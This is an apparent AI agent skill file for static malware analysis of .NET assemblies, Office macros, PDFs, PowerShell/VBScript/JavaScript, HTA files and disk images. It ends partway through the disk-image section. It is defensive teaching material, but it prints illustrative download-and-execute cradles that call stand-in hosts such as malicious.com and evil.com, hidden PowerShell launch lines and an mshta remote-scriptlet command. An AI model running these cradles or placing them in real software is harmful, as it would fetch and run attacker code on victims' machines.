---
name: specialized-file-analyzer
description: Analyze specialized file types beyond standard PE executables - .NET assemblies, Office macros, PDFs, PowerShell scripts, JavaScript, archives, HTA files, disk images (ISO/IMG/VHD/VHDX), and Linux ELF binaries. Use when you encounter documents, scripts, disk images, or non-Windows executables that require format-specific analysis tools and techniques. Claude runs the extraction and deobfuscation tooling on the host itself; nothing is executed.
---

# Specialized File Analyzer

Expert analysis of non-PE file formats commonly used in malware campaigns: .NET, Office documents, PDFs, scripts, HTA files, disk images, archives, and Linux binaries.

## When to Use This Skill

Use this skill when analyzing:
- **.NET/C# assemblies** (.exe, .dll with .NET framework)
- **Office documents** with macros (.docm, .xlsm, .doc, .xls)
- **PDF files** (suspicious attachments, exploit documents)
- **Scripts** (PowerShell .ps1, VBScript .vbs, JavaScript .js)
- **HTA files** (.hta — HTML Applications executed by mshta.exe)
- **Disk images** (.iso, .img, .vhd, .vhdx — container formats that bypass MOTW)
- **Archives** (.zip, .rar, .7z, .tar.gz)
- **Shortcuts** (.lnk files)
- **Linux binaries** (ELF executables)
- **Batch files** (.bat, .cmd)

**Key indicator:** `file` command shows non-PE32 executable or document type.

## Execution Model

- **You run the commands.** Every `bash` block in this skill is for you to execute on the host, then read and interpret. Do not ask the user to run tools and paste output unless a tool is missing and cannot be installed.
- **Locate skill files.** Scripts and reference files ship in this skill's directory. Set `R="${CLAUDE_PLUGIN_ROOT:-<dir containing this SKILL.md>}"` once (when installed as a plugin `$CLAUDE_PLUGIN_ROOT` is set; otherwise it is this skill folder). Your working directory is the user's analysis workspace, so prefix every script path below with `$R`, e.g. `python3 "$R"/scripts/ioc_extract.py`.
- **Nothing gets executed.** Decompile, extract, decode, beautify, grep — never run the sample, a macro, a script, or an extracted payload on the host. Blocks marked **VM only** (PowerShell, `cscript`, `strace`, dnSpy debugging) are for the analyst in the isolated VM; hand them over as instructions and analyze the text they bring back.
- **Static deobfuscation first.** Base64, hex, Chr(), Replace(), StrReverse, string concatenation: resolve them with Python on the host. Only when a stage is genuinely runtime-dependent (`Execute` of a downloaded blob) do you ask for a VM run.
- **Tool check** once per session, then degrade gracefully:
  ```bash
  command -v 7z unzip olevba oledump.py pdfid.py pdf-parser.py ilspycmd js-beautify lnkinfo readelf upx exiftool
  # olevba/oledump/XLM: pip install oletools        pdfid/pdf-parser: git clone https://github.com/DidierStevens/DidierStevensSuite
  # ilspycmd: dotnet tool install -g ilspycmd        js-beautify: pip install jsbeautifier        lnkinfo: apt install libyal-lnk-tools (or pip install LnkParse3)
  ```
  On REMnux everything above is preinstalled. If a decompiler/parser is unavailable, fall back to `strings -a -n 6` (and `-e l` for UTF-16) plus targeted grep — say so in the findings.
- **Every extracted stage is a new file:** `file` it, hash it, record it in `analysis_state.md`, and route it (PE → `malware-triage`; another document/script → the matching section here).
- **Finish every file type** by running the extracted text through `python3 scripts/ioc_extract.py` (repo root) so the IOCs land defanged in the state file.
- **Big outputs** (decompiled projects, olevba on a large workbook): write to a file, `wc -l`, then `grep` — never `cat` blindly.

## Quick File Type Identification

```bash
# Identify file type
file sample.bin

# Common outputs:
# "PE32+ console executable, for MS Windows" → Standard PE (use malware-triage)
# "PE32 executable (GUI) Intel 80386 Mono/.Net assembly" → .NET (use this skill)
# "Microsoft Office Document" → Office macro (use this skill)
# "PDF document, version 1.7" → PDF (use this skill)
# "HTML document text" → Check extension; if .hta → HTA (use this skill)
# "ISO 9660 CD-ROM filesystem data" → ISO image (use this skill)
# "DOS/MBR boot sector" → IMG disk image (use this skill)
# "Microsoft Disk Image" → VHD/VHDX (use this skill)
# "Zip archive data" → Archive (use this skill)
# "ELF 64-bit LSB executable" → Linux binary (use this skill)
# "ASCII text, with CRLF line terminators" → Script (use this skill)
```

---

## .NET / C# Assembly Analysis

### Detection
```bash
# Check for .NET assembly
file sample.exe | grep "Mono/.Net assembly"

# Or check strings
strings sample.exe | grep "mscoree.dll"

# Or: python3 malware-triage/scripts/pe_info.py sample.exe | grep '^\.NET:'
```

### Decompile on the host (ilspycmd — do this first)

```bash
# dotnet tool install -g ilspycmd   (needs the .NET SDK; REMnux ships it)
ilspycmd -p -o dotnet_src/ sample.exe          # full C# project
ilspycmd sample.exe > dotnet_src/all.cs        # single file when the project export fails
wc -l dotnet_src/all.cs
grep -nE 'static void Main|Application\.Run' dotnet_src/all.cs | head       # entry point
grep -nE 'WebClient|HttpClient|DownloadString|DownloadFile|DownloadData|WebRequest' dotnet_src/all.cs | head -20
grep -nE 'FromBase64String|Assembly\.Load|Invoke\(|GetMethod|Reflection|Activator' dotnet_src/all.cs | head -20
grep -nE 'Process\.Start|ProcessStartInfo|cmd\.exe|powershell' dotnet_src/all.cs | head
grep -nE 'Rijndael|AES|TripleDES|RC4|Xor|Decrypt|CreateDecryptor' dotnet_src/all.cs | head
grep -nE 'Registry\.|RegistryKey|CurrentVersion\\\\Run|schtasks|Startup' dotnet_src/all.cs | head
grep -nE 'VirtualAllocEx|WriteProcessMemory|CreateRemoteThread|NtUnmapViewOfSection|SetThreadContext|DllImport' dotnet_src/all.cs | head
grep -nE 'Debugger\.IsAttached|VirtualBox|VMware|SbieDll|IsDebuggerPresent' dotnet_src/all.cs | head
# resources: embedded payloads/config
python3 - sample.exe <<'EOF'
import sys
try:
    import pefile
except ImportError:
    sys.exit("pip install pefile")
pe = pefile.PE(sys.argv[1])
d = pe.DIRECTORY_ENTRY_RESOURCE if hasattr(pe, "DIRECTORY_ENTRY_RESOURCE") else None
if d:
    for t in d.entries:
        for e in t.directory.entries:
            for l in e.directory.entries:
                off, size = l.data.struct.OffsetToData, l.data.struct.Size
                data = pe.get_data(off, size)
                print(f"type={t.id} id={e.id} size={size} magic={data[:4].hex()}")
EOF
strings -a -n 8 -e l sample.exe | python3 scripts/ioc_extract.py      # .NET strings are UTF-16
```

If the decompiled code is unreadable (random identifiers, giant switch dispatchers, string-decryption calls everywhere) it is obfuscated: run `de4dot` (below) and decompile the output instead. Managed resources named like GUIDs or with high entropy are the embedded payload — extract with the pefile snippet or `ilspycmd`'s project export (`dotnet_src/Resources/`), then `file` and route them.

### Tool: dnSpy (GUI — analyst, in the VM, for debugging)

**Download:** https://github.com/dnSpy/dnSpy

**Workflow:**
1. Open sample.exe in dnSpy
2. Navigate: Assembly Explorer → sample.exe → Namespace → Classes
3. Find entry point: Right-click assembly → Go to Entry Point

**What to Look For:**

**Main() Function:**
```csharp
// Entry point - start here
public static void Main(string[] args)
{
    // Analyze execution flow
}
```

**Suspicious Namespaces:**
- `System.Net` - Network operations (WebClient, HttpClient)
- `System.Security.Cryptography` - Encryption/decryption
- `System.Reflection` - Dynamic code loading
- `System.Diagnostics.Process` - Process execution
- `System.IO` - File operations
- `Microsoft.Win32` - Registry access

**Common Malicious Patterns:**
```csharp
// Download and execute
WebClient wc = new WebClient();
wc.DownloadFile("http://malicious.com/payload.exe", "C:\\temp\\payload.exe");
Process.Start("C:\\temp\\payload.exe");

// Base64 decode embedded payload
byte[] decoded = Convert.FromBase64String(encodedPayload);

// Reflective loading
Assembly.Load(byte[] rawAssembly);

// Process injection
WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten);
```

**Extract Embedded Resources:**
```
Assembly Explorer → Right-click assembly → Resources
Look for:
- Embedded executables (byte arrays)
- Encrypted payloads
- Configuration data
- Icons (may hide data)

Right-click resource → Save
```

**Deobfuscation:**
```bash
# Using de4dot (automated deobfuscator)
de4dot sample.exe -o sample_deobfuscated.exe

# Handles common obfuscators:
# - ConfuserEx
# - .NET Reactor
# - Eazfuscator
# - Agile.NET
```

**Dynamic Debugging (VM only — ask the analyst to capture decrypted strings and bring them back as text):**
```
dnSpy: Debug → Start Debugging (F5)
Set breakpoints on suspicious functions
Step through execution (F10/F11)
Watch variables and decrypted strings
```

### Analysis Checklist - .NET

- [ ] Entry point identified (Main function)
- [ ] Obfuscation detected and removed (if needed)
- [ ] Embedded resources extracted
- [ ] Network URLs/IPs extracted
- [ ] Crypto keys identified
- [ ] Anti-analysis checks found
- [ ] Payload execution method documented
- [ ] IOCs extracted (URLs, IPs, file paths)

---

## Office Document / Macro Analysis

### Detection
```bash
# Macro-enabled formats
# .docm, .xlsm, .pptm → Office 2007+ with macros
# .doc, .xls, .ppt → Legacy Office (97-2003) with macros

file document.docm
# Output: "Microsoft Word 2007+"

# Quick macro check
strings document.docm | grep -i "vba\|macro\|autoopen"
```

### Tool: oledump.py (Primary - Didier Stevens)

**Installation:**
```bash
git clone https://github.com/DidierStevens/DidierStevensSuite   # oledump.py, pdfid.py, pdf-parser.py, ...
pip install oletools                                             # olevba, oleid, rtfobj, mraptor
```

**Workflow:**

**1. List Streams:**
```bash
python oledump.py document.docm

# Example output:
#  1:       114 '\x01CompObj'
#  2:      4096 '\x05DocumentSummaryInformation'
#  3: M    8192 'Macros/VBA/ThisDocument'  ← Macro present (M indicator)
#  4: m    1024 'Macros/VBA/_VBA_PROJECT'
#  5: M    4096 'Macros/VBA/Module1'
```

**2. Extract Macro Code:**
```bash
# Extract macro from stream 3
python oledump.py -s 3 -v document.docm

# Decompress corrupted VBA
python oledump.py -s 3 --vbadecompresscorrupt document.docm

# Save to file
python oledump.py -s 3 -v document.docm > extracted_macro.vba
```

**3. Analyze Macro Code:**

Look for **Auto-Execution Functions:**
```vba
Sub AutoOpen()          ' Word - runs on document open
Sub Document_Open()     ' Word - runs on document open
Sub Workbook_Open()     ' Excel - runs on workbook open
Sub Auto_Open()         ' Excel - runs on workbook open
```

Look for **Suspicious VBA Functions:**
```vba
' Command execution
Shell("cmd.exe /c powershell ...")
CreateObject("WScript.Shell").Run "..."

' File download
CreateObject("MSXML2.XMLHTTP")
URLDownloadToFile ...

' File system operations
CreateObject("Scripting.FileSystemObject")

' Dynamic code execution
ExecuteStatement
Eval()
CallByName()
```

### Tool: olevba (oletools Suite)

**Installation:**
```bash
pip install oletools
```

**Automated Analysis:**
```bash
# Comprehensive analysis
olevba document.docm

# Decode obfuscated strings
olevba --decode document.docm

# JSON output for parsing
olevba -j document.docm > analysis.json

# Extract IOCs only
olevba --decode document.docm | grep -E "http|https|powershell|cmd|wscript"
```

**Output Interpretation:**
- **AutoExec** - Auto-execution keywords found
- **Suspicious** - Suspicious VBA keywords
- **IOCs** - URLs, IPs, file paths
- **Hex Strings** - Encoded data
- **Base64 Strings** - Encoded payloads
- **Dridex Strings** - Dridex malware indicators

### Excel 4.0 Macros (XLM Macros)

**More evasive than VBA macros!**

```bash
# Detect XLM macros
python oledump.py document.xls | grep XL

# Extract with XLMMacroDeobfuscator
git clone https://github.com/DissectMalware/XLMMacroDeobfuscator
python XLMMacroDeobfuscator.py -f document.xls

# Or use olevba
olevba document.xls --deobf
```

### Modern Office Documents (.docx, .xlsx) - No Macros

**Template Injection Attack:**
```bash
# Extract Office Open XML structure
unzip document.docx -d extracted/

# Check for external template
cat extracted/word/_rels/document.xml.rels | grep "http"

# Look for:
# <Relationship Type="http://schemas.../attachedTemplate"
#              Target="http://malicious.com/template.dotm" TargetMode="External"/>
```

**Embedded Objects:**
```bash
# Check for embedded files
ls extracted/word/embeddings/

# Analyze embedded objects
file extracted/word/embeddings/*
```

### Analysis Checklist - Office Documents

- [ ] Macro presence confirmed
- [ ] All macro streams extracted
- [ ] Auto-execution functions identified
- [ ] Obfuscated strings decoded
- [ ] Download URLs extracted
- [ ] Payload execution method documented
- [ ] External template checked (.docx/.xlsx)
- [ ] Embedded objects analyzed
- [ ] IOCs extracted and defanged

---

## PDF Analysis

### Detection
```bash
file document.pdf
# Output: "PDF document, version 1.7"
```

### Tool: pdfid.py (Didier Stevens)

**Quick Triage:**
```bash
python pdfid.py document.pdf

# Red flags:
# /OpenAction   - Executes action on open
# /AA           - Additional actions (auto-execute)
# /JavaScript   - Embedded JavaScript
# /JS           - JavaScript (short form)
# /Launch       - Launch external program
# /EmbeddedFile - Embedded files
# /RichMedia    - Flash/multimedia content
# /ObjStm       - Object streams (can hide malicious content)
```

**Example Output:**
```
PDFiD 0.2.7 document.pdf
 PDF Header: %PDF-1.7
 obj                   45
 endobj                45
 stream                12
 endstream             12
 /Page                  5
 /Encrypt               0
 /ObjStm                0
 /JS                    3  ← Suspicious!
 /JavaScript            2  ← Suspicious!
 /AA                    1  ← Auto-action present!
 /OpenAction            1  ← Executes on open!
 /Launch                0
 /EmbeddedFile          0
 /RichMedia             0
```

### Tool: pdf-parser.py (Didier Stevens)

**Extract JavaScript:**
```bash
# Search for JavaScript objects
python pdf-parser.py --search javascript document.pdf

# Extract specific object
python pdf-parser.py --object 15 document.pdf

# Dump JavaScript code
python pdf-parser.py --object 15 --raw document.pdf > extracted_js.txt

# Filter streams
python pdf-parser.py --filter document.pdf
```

### Tool: peepdf (Interactive Analysis)

```bash
# Install (peepdf-3 is the Python 3 compatible fork)
pip install peepdf-3

# Interactive mode
peepdf -i document.pdf

# Commands in interactive shell:
> tree             # Show object structure
> object 15        # Inspect object 15
> stream 15        # View stream 15
> javascript       # Extract all JavaScript
> extract stream 15 > payload.bin
```

### PDF Exploits

**Common CVEs:**
- **CVE-2013-2729** - JavaScript heap spray
- **CVE-2010-0188** - libtiff buffer overflow
- **CVE-2009-0927** - JBIG2Decode heap overflow
- **CVE-2023-21608** - Adobe Acrobat use-after-free (remote code execution)
- **CVE-2023-26369** - Adobe Acrobat out-of-bounds write (actively exploited in the wild)
- **CVE-2024-4367** - PDF.js arbitrary JavaScript execution in Firefox (affects web-based PDF viewers)
- **CVE-2023-36664** - Ghostscript command injection via crafted PDF (affects Linux/server-side rendering)

**Shellcode Detection:**
```bash
# Look for shellcode in streams
python pdf-parser.py --raw --filter document.pdf | grep -aP "(\x90{10}|\xeb)"

# Extract suspicious streams
python pdf-parser.py --object <id> --raw document.pdf | hexdump -C
```

### Analysis Checklist - PDF

- [ ] pdfid scan completed (flags identified)
- [ ] JavaScript extracted (if present)
- [ ] Embedded files extracted
- [ ] Auto-action mechanism documented
- [ ] Shellcode indicators checked
- [ ] CVE exploitation checked (if relevant)
- [ ] URLs/IPs extracted from JS
- [ ] IOCs documented

---

## PowerShell / Script Analysis

### PowerShell (.ps1) Deobfuscation

**Common Obfuscation Patterns:**

**Base64 Encoding:**
```powershell
# Encoded command execution
powershell.exe -EncodedCommand <base64_string>

# Decode manually
$encoded = "Base64StringHere"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
```

**String Concatenation:**
```powershell
$url = "ht" + "tp://" + "evil.com"
```

**Compression:**
```powershell
$ms = New-Object IO.MemoryStream
$ms.Write([Convert]::FromBase64String($compressed), 0, $compressedLength)
$ms.Seek(0,0) | Out-Null
$cs = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
```

### Decode on the host (do this first)

```bash
wc -l malicious.ps1; head -c 2000 malicious.ps1
grep -noiE 'Invoke-Expression|IEX|DownloadString|DownloadFile|Invoke-WebRequest|IWR|Net\.WebClient|FromBase64String|-EncodedCommand|-enc |-e |GzipStream|DeflateStream|Reflection\.Assembly|Add-Type|VirtualAlloc|-WindowStyle Hidden|-nop|-w hidden|Bypass|Start-Process|New-Object|Set-ItemProperty|schtasks|Register-ScheduledTask' malicious.ps1 | sort -t: -k2 -u

# -EncodedCommand / -enc blobs are UTF-16LE base64
python3 - <<'EOF'
import base64, re, sys
src = open("malicious.ps1", encoding="utf-8", errors="replace").read()
for m in re.finditer(r"[A-Za-z0-9+/]{40,}={0,2}", src):
    raw = base64.b64decode(m.group(0) + "=" * (-len(m.group(0)) % 4))
    for enc in ("utf-16le", "utf-8"):
        try:
            txt = raw.decode(enc)
            if txt.isprintable() or "\n" in txt:
                print(f"--- offset {m.start()} ({enc}) ---\n{txt[:2000]}\n"); break
        except UnicodeDecodeError:
            continue
    else:
        print(f"--- offset {m.start()}: binary, magic {raw[:4].hex()} ({len(raw)} bytes) — save and `file` it ---")
EOF

# gzip/deflate-wrapped stages
python3 -c "import base64,gzip,sys,zlib; b=base64.b64decode(sys.argv[1]); print((gzip.decompress(b) if b[:2]==b'\x1f\x8b' else zlib.decompress(b,-15)).decode('utf-8','replace'))" '<blob>'

# string concatenation / format-operator tricks: resolve by hand with python string ops, or print the pieces
grep -oE "'[^']*'\s*\+\s*'[^']*'" malicious.ps1 | head
```

Repeat until the final stage is readable. Save each stage (`stage1.ps1`, `stage2.bin` …), `file` binary ones, and run `python3 scripts/ioc_extract.py` on the text ones.

### Tool: PSDecode (VM only)

PSDecode overrides `IEX`/`Invoke-Expression` with a logger and *runs the script* under PowerShell. That is dynamic analysis — only in the isolated VM, and only after the host-side decoding above stalls:

```powershell
git clone https://github.com/R3MRUM/PSDecode
Import-Module .\PSDecode.ps1
PSDecode -InputFile malicious.ps1 -OutputFile decoded.txt     # bring decoded.txt back to the host
```

**Suspicious PowerShell Patterns:**
- `Invoke-Expression` / `IEX` - Execute string as code
- `Invoke-WebRequest` / `Invoke-RestMethod` - Download content
- `DownloadString` / `DownloadFile` - Download payloads
- `FromBase64String` - Decode embedded payload
- `IO.Compression.GzipStream` - Decompress payload
- `Reflection.Assembly]::Load` - Load assembly from memory
- `-EncodedCommand` - Base64 encoded command
- `-WindowStyle Hidden` - Hide window
- `-ExecutionPolicy Bypass` - Bypass script execution policy

### VBScript (.vbs) Analysis

**Common Obfuscation Techniques:**

**Chr() Concatenation:**
```vbs
' Characters assembled from ASCII codes to hide strings
Dim cmd
cmd = Chr(99) & Chr(109) & Chr(100)   ' = "cmd"
CreateObject("WScript.Shell").Run cmd & ".exe /c " & Chr(112) & Chr(105) & Chr(110) & Chr(103) & " evil.com"
```

**Execute / ExecuteGlobal:**
```vbs
' Execute() runs a string as code in the current scope
' ExecuteGlobal() runs a string as code in the global scope
Dim payload
payload = "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").Run " & Chr(34) & "calc.exe" & Chr(34)
Execute(payload)

' Chained: decode then execute
ExecuteGlobal(Base64Decode(encodedPayload))
```

**String Reversal with StrReverse:**
```vbs
' String stored backwards to evade signature detection
Dim hidden
hidden = "elbatius/c/ exe.dmc"
CreateObject("WScript.Shell").Run StrReverse(hidden)
```

**Replace() Chains:**
```vbs
' Junk characters inserted and stripped at runtime
Dim url
url = "hXXXtXXXtXXXpXXX:XXXXX//evil.com/payload.exe"
url = Replace(url, "XXX", "")   ' = "http://evil.com/payload.exe"
```

**WScript.Shell via GetObject:**
```vbs
' Alternative to CreateObject — avoids direct string "WScript.Shell"
Set sh = GetObject("new:{72C24DD5-D70A-438B-8A42-98424B88AFB8}")
sh.Run "powershell -nop -w hidden -enc <base64>"
```

**Deobfuscation Approach:**

**Manual Chr() Resolution:**
```bash
# Extract all Chr() calls and resolve them
grep -oE "Chr\([0-9]+\)" malicious.vbs | sort -u

# Python one-liner to resolve Chr values from grep output
python3 -c "
import re, sys
code = open('malicious.vbs').read()
for m in re.finditer(r'Chr\((\d+)\)', code):
    print(f'Chr({m.group(1)}) = {chr(int(m.group(1)))}')
"
```

**Resolve statically on the host first:**
```bash
python3 - malicious.vbs <<'EOF'
import re, sys
code = open(sys.argv[1], encoding="utf-8", errors="replace").read()
code = re.sub(r"Chr[Ww]?\((\d+)\)", lambda m: '"' + chr(int(m.group(1))) + '"', code)     # Chr(99) -> "c"
code = re.sub(r'"\s*&\s*"', "", code)                                                        # "a" & "b" -> "ab"
code = re.sub(r'StrReverse\("([^"]*)"\)', lambda m: '"' + m.group(1)[::-1] + '"', code)
for m in re.finditer(r'Replace\("([^"]*)",\s*"([^"]*)",\s*"([^"]*)"\)', code):
    code = code.replace(m.group(0), '"' + m.group(1).replace(m.group(2), m.group(3)) + '"')
open(sys.argv[1] + ".resolved", "w").write(code); print(code[:4000])
EOF
grep -iE 'Execute|Eval|WScript\.Shell|\.Run|XMLHTTP|ADODB|SaveToFile|powershell|cmd' malicious.vbs.resolved
```

**Extract Execute() Payloads (VM only — the Echo swap still runs the script):**
```vbs
' SAFE deobfuscation technique:
' Replace Execute() / ExecuteGlobal() with WScript.Echo() to print payload instead of running it
' Original:
Execute(decodedPayload)
' Change to:
WScript.Echo(decodedPayload)

' Then run in a safe environment to reveal the next stage
cscript /nologo malicious_safe.vbs
```

**Variable Substitution Tracing:**
```bash
# Trace variable assignments to follow payload construction
grep -n "=" malicious.vbs | grep -v "'.*="   # exclude comments
# Follow each variable from assignment to use, reconstructing the final value
```

**Key Suspicious Patterns:**
- `CreateObject("WScript.Shell")` - Execute OS commands, launch processes
- `GetObject("winmgmts:")` - WMI access (process creation, system enumeration)
- `Shell.Application` - Explorer shell invocation (can bypass some restrictions)
- `ADODB.Stream` - Binary file writes (used to drop PE payloads to disk)
- `MSXML2.XMLHTTP` / `WinHttp.WinHttpRequest` - HTTP download cradles
- `Scripting.FileSystemObject` - File system reads and writes
- `Execute` / `ExecuteGlobal` / `Eval` - Dynamic code execution (always deobfuscate before analyzing)
- `StrReverse` / `Chr()` / `Replace()` - String obfuscation primitives

**Analysis:**
```bash
# Read script
cat malicious.vbs

# Search for high-priority patterns
grep -i "CreateObject\|WScript.Shell\|MSXML2.XMLHTTP\|Eval\|Execute\|ExecuteGlobal\|ADODB.Stream\|GetObject\|StrReverse" malicious.vbs

# Last resort, VM only: replace Eval()/Execute() with WScript.Echo() and run: cscript /nologo malicious_safe.vbs
```

### JavaScript (.js) Analysis

```bash
# Beautify obfuscated JS (pip install jsbeautifier)
js-beautify malicious.js > beautified.js
grep -nE 'eval\(|unescape\(|ActiveXObject|WScript|\.Run\(|XMLHTTP|fromCharCode|atob\(|split\(|reverse\(|\.replace\(' beautified.js | head -40
# String.fromCharCode(…) arrays and hex/percent escapes: decode with python
python3 -c "import sys,re; s=open('beautified.js').read(); print(re.sub(r'\\\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1),16)), s)[:3000])"
```

Never run the script with `node`/`cscript` on the host; a VM run is the fallback when the final stage is fetched remotely.

**Suspicious Patterns:**
```javascript
// Code execution
eval(encodedCode);

// Decode strings
unescape("%75%6E%65%73%63%61%70%65");
decodeURIComponent("%20");

// ActiveX (Windows COM objects)
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c ...");

// WScript objects
var fso = new ActiveXObject("Scripting.FileSystemObject");
```

### Analysis Checklist - Scripts

- [ ] Script type identified (PS1, VBS, JS, BAT)
- [ ] Obfuscation detected and removed
- [ ] Base64/encoded strings decoded
- [ ] Download URLs extracted
- [ ] Execution commands documented
- [ ] Dropped file paths identified
- [ ] IOCs extracted (URLs, IPs, domains)

---

## Archive Analysis

### Safe Inspection (No Extraction)

```bash
# List contents without extracting
7z l archive.zip
unzip -l archive.zip
tar -tzf archive.tar.gz
rar l archive.rar

# Look for red flags:
# - Double extensions (invoice.pdf.exe)
# - Executable files (.exe, .scr, .com, .bat, .vbs)
# - LNK files (shortcuts)
# - Deeply nested archives (archive.zip -> archive2.zip -> payload.exe)
```

### Extract Safely

```bash
# Create isolated directory
mkdir /tmp/extracted_archive
cd /tmp/extracted_archive

# Extract
7z x ../archive.zip
unzip ../archive.zip
tar -xzf ../archive.tar.gz

# Immediately check file types
file *
```

### Password-Protected Archives

**Common passwords in malware:**
- `infected`
- `malware`
- `virus`
- `2024` / `2025`
- `123456`

```bash
# Extract with password
7z x -pinfected archive.zip
unzip -P infected archive.zip
```

### LNK (Shortcut) File Analysis

**Tool: LECmd (Windows)**
```powershell
# Download from: https://ericzimmerman.github.io/
LECmd.exe -f malicious.lnk
```

**Tool: lnkinfo (Linux)**
```bash
lnkinfo malicious.lnk

# Look for:
# - Target path (what it executes)
# - Command-line arguments
# - Working directory
# - Icon location (may reveal payload location)
```

**Manual Strings Analysis:**
```bash
strings malicious.lnk | grep -E "\.exe|\.dll|http|powershell|cmd"
```

### Analysis Checklist - Archives

- [ ] Contents listed without extraction
- [ ] File extensions verified (no double extensions)
- [ ] Files extracted to isolated directory
- [ ] All extracted files typed (file command)
- [ ] LNK files analyzed (if present)
- [ ] Nested archives checked
- [ ] Password documented (if applicable)

---

## HTA (HTML Application) Analysis

### What HTA Files Are

HTA files (`.hta`) are HTML documents executed by `mshta.exe` (Microsoft HTML Application Host) rather than a web browser. Because mshta.exe is a trusted Windows binary, HTAs run with the full privileges of the current user and have unrestricted access to COM objects, ActiveX controls, and the local file system — none of the browser sandbox restrictions apply. This makes HTAs a popular delivery vehicle for malware, often distributed via phishing emails or dropped inside ISO/ZIP archives.

**MITRE ATT&CK: T1218.005 — System Binary Proxy Execution: Mshta**

### Detection

```bash
# File identification
file suspicious.hta
# Output: "HTML document text" (always verify the extension separately)

# Quick check for execution indicators
strings suspicious.hta | grep -iE "mshta|WScript|Shell|ActiveX|XMLHTTP|powershell"
```

### Analysis Approach

HTAs are plain text — open them in any text editor or IDE. The analysis goal is to extract and understand all embedded scripts before any execution occurs.

**1. Extract Embedded Scripts**

```bash
# View raw content
cat suspicious.hta

# Grep for script blocks
grep -i "<script" suspicious.hta

# Pull out VBScript/JScript content between script tags
grep -A 50 "<script" suspicious.hta
```

**2. Check for ActiveX Object Instantiation**

ActiveX objects are the primary attack surface in HTAs. Flag every `CreateObject` and `new ActiveXObject` call:

```vbs
' VBScript - common ActiveX patterns
Set sh  = CreateObject("WScript.Shell")               ' OS command execution
Set fso = CreateObject("Scripting.FileSystemObject")  ' File I/O
Set xhr = CreateObject("MSXML2.XMLHTTP")               ' HTTP download
Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")  ' Alternative HTTP
```

```javascript
// JScript - equivalent patterns
var sh  = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var xhr = new ActiveXObject("MSXML2.XMLHTTP");
```

**3. Look for High-Priority Execution Sinks**

```bash
grep -iE "Shell\.Run|ShellExecute|WScript\.Shell|Scripting\.FileSystemObject|XMLHTTP|WinHttp|powershell|cmd\.exe|wscript|cscript|regsvr32|rundll32|msiexec" suspicious.hta
```

**4. Decode Obfuscated Payloads**

HTA malware frequently encodes payloads in `innerHTML`, script variables, or injected DOM content:

```bash
# Find base64 strings (look for long alphanum strings)
grep -oE "[A-Za-z0-9+/]{40,}={0,2}" suspicious.hta

# Find HTML-entity or percent-encoded strings
grep -oE "&#[0-9]+;" suspicious.hta
grep -oE "%[0-9A-Fa-f]{2}" suspicious.hta
```

**Decode base64 payload (Linux):**
```bash
echo "Base64StringHere" | base64 -d > decoded_payload.bin
file decoded_payload.bin
```

**Decode base64 payload (PowerShell — for Unicode-encoded commands):**
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("Base64StringHere"))
```

### Common Malware Patterns

**Download-and-Execute via XMLHTTP:**
```vbs
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", "http://malicious[.]com/payload.exe", False
xhr.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1   ' Binary
stream.Open
stream.Write xhr.responseBody
stream.SaveToFile "C:\Users\Public\payload.exe", 2
stream.Close
CreateObject("WScript.Shell").Run "C:\Users\Public\payload.exe"
```

**PowerShell Invocation (common cradle):**
```vbs
CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc <base64>", 0, False
```

**Payload hidden in innerHTML and read back at runtime:**
```html
<div id="data" style="display:none">TVqQAAMAAAAEAAAA...</div>
<script language="VBScript">
  Dim raw
  raw = document.getElementById("data").innerHTML
  ' decode and execute raw
</script>
```

**mshta.exe executing inline script (seen in phishing URLs):**
```
mshta.exe javascript:a=(GetObject("script:http://malicious[.]com/payload.sct")).Exec();close();
```

### Tools

| Task | Tool |
|------|------|
| Read/edit HTA content | Any text editor (VS Code, Notepad++, vim) |
| DOM structure inspection | Browser dev tools (open as HTML — do NOT click Run) |
| Decode base64 strings | `base64 -d` (Linux), CyberChef |
| Chr()/VBS deobfuscation | Manual or `cscript` with Execute→Echo swap (see VBScript section) |
| Trace COM object calls | Process Monitor (filter on mshta.exe) — dynamic analysis VM only |

### Analysis Checklist - HTA

- [ ] File opened as plain text — script language identified (VBScript / JScript / mixed)
- [ ] All `CreateObject` / `new ActiveXObject` calls enumerated
- [ ] `Shell.Run` / `ShellExecute` arguments extracted
- [ ] Download URLs identified (XMLHTTP, WinHttp, URLDownloadToFile)
- [ ] Encoded payloads (base64, Chr(), HTML entities) decoded
- [ ] innerHTML / injected DOM payload sources checked
- [ ] Dropped file paths documented
- [ ] IOCs extracted and defanged

---

## Disk Image Analysis (ISO / IMG / VHD / VHDX)

### Why Malware Uses Disk Images

Disk images are a primary MOTW (Mark-of-the-Web) bypass technique on Windows 10 and 11. When a file is downloaded from the internet, Windows attaches a Zone Identifier alternate data stream (`Zone.Identifier:$DATA`, Zone 3) to flag it as untrusted. Files extracted from a mounted disk image do **not** inherit the source image's MOTW, so payloads inside an ISO/VHD execute without SmartScreen prompts or Protected View restrictions.

Additionally, `.iso` files auto-mount as a virtual DVD drive on double-click in Windows 10+, and `.vhd`/`.vhdx` files auto-mount as a virtual disk — making the delivery seamless for the victim.

**MITRE ATT&CK: T1553.005 — Subvert Trust Controls: Mark-of-the-Web Bypass**

### Detection

```bash
file suspicious.iso
# "ISO 9660 CD-ROM filesystem data"

file suspicious.img
# "DOS/MBR boot sector" or "Linux rev 1.0 ext2 filesystem data"

file suspicious.vhd
# "Microsoft Disk Image, Virtual Server or Virtual PC, version 0x00010000"

file suspicious.vhdx
# "Microsoft Disk Image eXtended"
```

### Analysis Approach

Always analyze disk images **read-only** and **without executing** any contained files outside an isolated VM.

**Option A: Extract Without Mounting (Safest — 7-Zip)**

Works on Linux, Windows, and macOS. No kernel interaction required.

```bash
# List contents first
7z l suspicious.iso

# Extract to isolated directory
mkdir /tmp/iso_contents
7z x suspicious.iso -o/tmp/iso_contents/

# Identify all extracted files
